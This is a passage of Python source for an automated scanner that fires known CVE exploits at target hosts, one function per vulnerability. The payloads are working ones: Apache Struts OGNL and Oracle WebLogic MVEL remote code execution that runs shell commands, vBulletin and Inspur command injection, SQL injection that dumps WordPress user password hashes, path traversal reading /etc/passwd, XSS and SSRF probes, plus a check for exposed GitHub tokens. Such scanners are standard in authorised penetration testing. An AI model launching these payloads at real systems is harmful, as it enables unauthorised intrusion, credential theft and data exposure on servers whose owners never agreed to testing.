  myKey = "d25f7ddc3a96c1202bf1a16ddf2ba554"
  vulnCat = "LFI"
  vulnName = "CVE-2020-29227"
  severity = "P1"
  vulnDsc = "Car Rental Management System 1.0 - Local File Inclusion (LFI)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/index.php?page=/etc/passwd%00']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-28976
def attMOD173(progScope):
  myKey = "1e91f4bc581a9c942a3c25fe9f94f036"
  vulnCat = "SSRF"
  vulnName = "CVE-2020-28976"
  severity = "P3"
  vulnDsc = "Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/canto/includes/lib/detail.php?subdomain=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/','/wp-content/plugins/canto/includes/lib/get.php?subdomain=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/','/wp-content/plugins/canto/includes/lib/tree.php?subdomain=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-28351
def attMOD174(progScope):
  myKey = "b2ea4725037df34a6d159d7750cd7058"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-28351"
  severity = "P3"
  vulnDsc = "ShoreTel 19.46.1802.0 XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-27982
def attMOD175(progScope):
  myKey = "7fb6037070dcff9de52345c97e0d4c78"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-27982"
  severity = "P3"
  vulnDsc = "IceWarp WebMail Reflected XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E']
  redirAllow = False
  statusF = 200
  textF = '<img src=x onerror=alert(1)>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-27735
def attMOD176(progScope):
  myKey = "1cb6d7fbca5e57aa2e888cfddda35104"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-27735"
  severity = "P3"
  vulnDsc = "Wing FTP's Web Interface XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/help/english/index.html?javascript&#58;alert(document.domain)']
  redirAllow = False
  statusF = 200
  textF = '<frame name="hmcontent" src="javascript:alert(document.domain)" title="Content frame">'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-2551
def attMOD177(progScope):
  myKey = "986cfa6977d4f4c850f57e7ebde14e7d"
  vulnCat = "RCE"
  vulnName = "CVE-2020-2551"
  severity = "P1"
  vulnDsc = "Unauthenticated Oracle WebLogic Server RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/console/login/LoginForm.jsp']
  redirAllow = False
  statusF = 200
  textF = 'WebLogic'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and ('10.3.6.0' in z.text or '12.1.3.0' in z.text or '12.2.1.3' in z.text or '12.2.1.4' in z.text) )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-25495
def attMOD178(progScope):
  myKey = "7964424ae238fd18e803e05c895debc4"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-25495"
  severity = "P3"
  vulnDsc = "A reflected Cross-site scripting (XSS) vulnerability in Xinuo"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/cgi-bin/manlist?section=%22%3E%3Ch1%3Ehello%3C%2Fh1%3E%3Cscript%3Ealert(/{{randstr}}/)%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '<h1>hello</h1><script>alert(/{{randstr}}/)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# github personal token
def attMOD179(progScope):
  myKey = "bcb88ee73929939933fe0bb6ee09401a"
  vulnCat = "Exposure"
  vulnName = "githubToken"
  severity = "P1"
  vulnDsc = "Find github personal tokens"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = '"github.com": "ghp_'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-24571
def attMOD180(progScope):
  myKey = "70ea3c71bf675d01cc841abb7319b673"
  vulnCat = "PathTraversal"
  vulnName = "CVE-2020-24571"
  severity = "P2"
  vulnDsc = "NexusDB v4.50.22 Path Traversal"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/../../../../../../../../windows/win.ini']
  redirAllow = False
  statusF = 200
  textF = '[extensions]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-24550
def attMOD181(progScope):
  myKey = "d9ce7fdb4970432b3620773e1abd0c8c"
  vulnCat = "OpenRedirect"
  vulnName = "CVE-2020-24550"
  severity = "P3"
  vulnDsc = "An Open Redirect vulnerability in EpiServer"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/find_v2/_click?_t_id=&_t_q=&_t_hit.id=&_t_redirect=https://example.com']
  redirAllow = False
  statusF = 301
  textF = 'https://example.com'
  condition = lambda z : True if( (z.status_code == statusF) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-24312
def attMOD182(progScope):
  myKey = "186dff15caf5d34d5ce4a7add8707db6"
  vulnCat = "Disclosure"
  vulnName = "CVE-2020-24312"
  severity = "P2"
  vulnDsc = "WordPress Plugin File Manager (wp-file-manager) Backup Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/uploads/wp-file-manager-pro/fm_backup/']
  redirAllow = False
  statusF = 200
  textF = 'wp-content/uploads/wp-file-manager-pro/fm_backup'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Index of' in z.text and 'backup_' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-24223
def attMOD183(progScope):
  myKey = "7b2589a4d817ea981e04af21f909210e"
  vulnCat = ""
  vulnName = "CVE-2020-24223"
  severity = "P3"
  vulnDsc = "Mara CMS  7.5 - Reflective Cross-Site Scripting"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/contact.php?theme=tes%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E']
  redirAllow = False
  statusF = 200
  textF = '"><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-24148
def attMOD184(progScope):
  myKey = "da6abf085b27fcfdff450811021a067c"
  vulnCat = "SSRF"
  vulnName = "CVE-2020-24148"
  severity = "P1"
  vulnDsc = "Import XML & RSS Feeds Wordpress Plugin <= 2.0.1 SSRF"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = """type=url&data=http%3A%2F%2F0000nlm6c0j53v2s668g61398133715me.interact.sh%2F&xmlaction=preview&node=0"""
  urlList = ['/wp-admin/admin-ajax.php?action=moove_read_xml']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-23517
def attMOD185(progScope):
  myKey = "d3dcc7a797a3c0478c65fe79749aba5d"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-23517"
  severity = "P3"
  vulnDsc = "Aryanic HighMail (High CMS) XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ["/login/?uid=\"><img%20src=\"x\"%20onerror=\"alert(%27XSS%27);\">"]
  redirAllow = False
  statusF = 200
  textF = "<img src=\"x\" onerror=\"alert('XSS')"
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-22840
def attMOD186(progScope):
  myKey = "e193e91fa49bcb602a40f99dd946a48b"
  vulnCat = "OpenRedirect"
  vulnName = "CVE-2020-22840"
  severity = "P3"
  vulnDsc = "b2evolution CMS Open redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/email_passthrough.php?email_ID=1&type=link&email_key=5QImTaEHxmAzNYyYvENAtYHsFu7fyotR&redirect_to=http%3A%2F%2Fexample.com']
  redirAllow = False
  statusF = 302
  textF = 'http://example.com'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 301) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-22840
def attMOD187(progScope):
  myKey = "2894a7bc77d86e646448dfbf68387dae"
  vulnCat = "Open Redirect"
  vulnName = "CVE-2020-22840"
  severity = "P3"
  vulnDsc = "b2evolution CMS Open redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/email_passthrough.php?email_ID=1&type=link&email_key=5QImTaEHxmAzNYyYvENAtYHsFu7fyotR&redirect_to=http%3A%2F%2Fexample.com']
  redirAllow = False
  statusF = 302
  textF = 'http://example.com'
  condition = lambda z : True if( (z.status_code == statusF) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-2140
def attMOD188(progScope):
  myKey = "3ac741b05c941d92326ecfa444cba023"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-2140"
  severity = "P3"
  vulnDsc = "Jenkin Audit Trail Plugin XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample','/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample']
  redirAllow = False
  statusF = 200
  textF = '<h1>sample'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-21224
def attMOD189(progScope):
  myKey = "8cee382acbc557108a484d2e0c1bb455"
  vulnCat = "RCE"
  vulnName = "CVE-2020-21224"
  severity = "P1"
  vulnDsc = "Inspur ClusterEngine V4.0 RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/x-www-form-urlencoded'}
  reqMethod = "POST"
  postData = """op=login&username=;`cat /etc/passwd`&password="""
  urlList = ['/login']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-2096
def attMOD190(progScope):
  myKey = "77f07abb7422de0d50471284fad4d684"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-2096"
  severity = "P3"
  vulnDsc = "Jenkins Gitlab Hook XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/gitlab/build_now%3Csvg/onload=alert(1337)%3E']
  redirAllow = False
  statusF = 200
  textF = '<svg/onload=alert(1337)>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-2036
def attMOD191(progScope):
  myKey = "897381b78c342f8c429ff4ed8a032120"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-2036"
  severity = "P2"
  vulnDsc = "Palo Alto Networks Reflected XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E','/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E']
  redirAllow = False
  statusF = 200
  textF = '<svg/onload=alert(1)>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-19625
def attMOD192(progScope):
  myKey = "5d83d572d5926a62874b0ae91aa9ba97"
  vulnCat = "RCE"
  vulnName = "CVE-2020-19625"
  severity = "P1"
  vulnDsc = "Gridx 1.3 RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/tests/support/stores/test_grid_filter.php?query=phpinfo();']
  redirAllow = False
  statusF = 200
  textF = 'PHP Extension'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'PHP Version' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-1943
def attMOD193(progScope):
  myKey = "f6ad9530135a7c1a60925cd696d37a63"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-1943"
  severity = "P3"
  vulnDsc = "Apache OFBiz Reflected XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(xss)%3E']
  redirAllow = False
  statusF = 200
  textF = '<svg/onload=alert(xss)>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-19295
def attMOD194(progScope):
  myKey = "330078d30e79cd474b903609a0e23193"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-19295"
  severity = "P3"
  vulnDsc = "Jeesns Weibo Topic Reflection XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/weibo/topic/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-19283
def attMOD195(progScope):
  myKey = "36ec0e74f61ab43f5a3ec7064c16a3c3"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-19283"
  severity = "P3"
  vulnDsc = "Jeesns newVersion Reflection XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-19282
def attMOD196(progScope):
  myKey = "5aa8465686f246ff953ead91f98aa8f8"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-19282"
  severity = "P3"
  vulnDsc = "Jeesns 1.4.2 XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/error?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-17530
def attMOD197(progScope):
  myKey = "1373d65f9eb128552d52f941197bd6e9"
  vulnCat = "RCE"
  vulnName = "CVE-2020-17530"
  severity = "P1"
  vulnDsc = "Apache Struts RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-17519
def attMOD198(progScope):
  myKey = "bd72133ca701fff045722834d074c0b3"
  vulnCat = "Traversal"
  vulnName = "CVE-2020-17519"
  severity = "P2"
  vulnDsc = "Apache Flink directory traversal"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-17496
def attMOD199(progScope):
  myKey = "e539e56dd6e7f61c911aed067254761b"
  vulnCat = "RCE"
  vulnName = "CVE-2020-17496"
  severity = "P1"
  vulnDsc = "vBulletin Pre-Auth RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/x-www-form-urlencoded'}
  reqMethod = "POST"
  postData = '''subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec('cat ../../../../../../../../../../../../etc/passwd'); exit;"'''
  urlList = ['/ajax/render/widget_tabbedcontainer_tab_panel']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-17453
def attMOD200(progScope):
  myKey = "b8376bcc6e0ade313a878061b61aa643"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-17453"
  severity = "P3"
  vulnDsc = "WSO2 Carbon Management Console - XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/carbon/admin/login.jsp?msgId=%27%3Balert(%27nuclei%27)%2F%2F']
  redirAllow = False
  statusF = 200
  textF = "'';alert('nuclei')//';"
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-17362
def attMOD201(progScope):
  myKey = "bee3037c321e78a6b5047a42ff088b7d"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-17362"
  severity = "P3"
  vulnDsc = "Nova Lite < 1.3.9 - Unauthenticated Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?s=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-15920
def attMOD202(progScope):
  myKey = "c780b87fd2db27dd4e038b2dfbf04586"
  vulnCat = "RCE"
  vulnName = "CVE-2020-15920"
  severity = "P1"
  vulnDsc = "Unauthenticated RCE at Mida eFramework on 'PDC/ajaxreq.php'"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/PDC/ajaxreq.php?PARAM=127.0.0.1+-c+0%3B+cat+%2Fetc%2Fpasswd&DIAGNOSIS=PING']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-14883
def attMOD203(progScope):
  myKey = "1d18ae47a456dc410127a58f511135e1"
  vulnCat = "RCE"
  vulnName = "CVE-2020-14883"
  severity = "P2"
  vulnDsc = "Oracle WebLogic Server Administration Console Handle RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/x-www-form-urlencoded'
      ,'Test-Header': 'cat /etc/passwd'}
  reqMethod = "POST"
  postData = """test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("Test-Header");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')"""
  urlList = ['/console/images/%252e%252e%252fconsole.portal']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-14181
def attMOD204(progScope):
  myKey = "80bb4b552b7a1104b6bc91ad3cbeee92"
  vulnCat = "UserEnum"
  vulnName = "CVE-2020-14181"
  severity = "P3"
  vulnDsc = "User enumeration via insecure Jira endpoint"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/secure/ViewUserHover.jspa']
  redirAllow = False
  statusF = 200
  textF = 'User does not exist'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-14179
def attMOD205(progScope):
  myKey = "c37c1e75a718ff44588316bf9b8660af"
  vulnCat = "Exposure"
  vulnName = "CVE-2020-14179"
  severity = "P3"
  vulnDsc = "Sensitive data exposure via insecure Jira endpoint"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/secure/QueryComponent!Default.jspa']
  redirAllow = False
  statusF = 200
  textF = '{"searchers":{"groups'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'no projects found' not in str(z.text).lower() )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-14092
def attMOD206(progScope):
  myKey = "59d6a5603bab2bcdee7385c6c7438ffb"
  vulnCat = "SQLi"
  vulnName = "CVE-2020-14092"
  severity = "P1"
  vulnDsc = "WordPress Payment Form For Paypal Pro Unauthenticated SQL Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users']
  redirAllow = False
  statusF = 200
  textF = '"user_login"'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '"user_email"' in z.text and '"user_pass"' in z.text and '"user_activation_key"' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-13937
def attMOD207(progScope):
  myKey = "d2f1e7df91a44fa2a57006cee9087542"
  vulnCat = "Disclosure"
  vulnName = "CVE-2020-13937"
  severity = "P3"
  vulnDsc = "Apache Kylin Unauth"
  vulnPath = ""
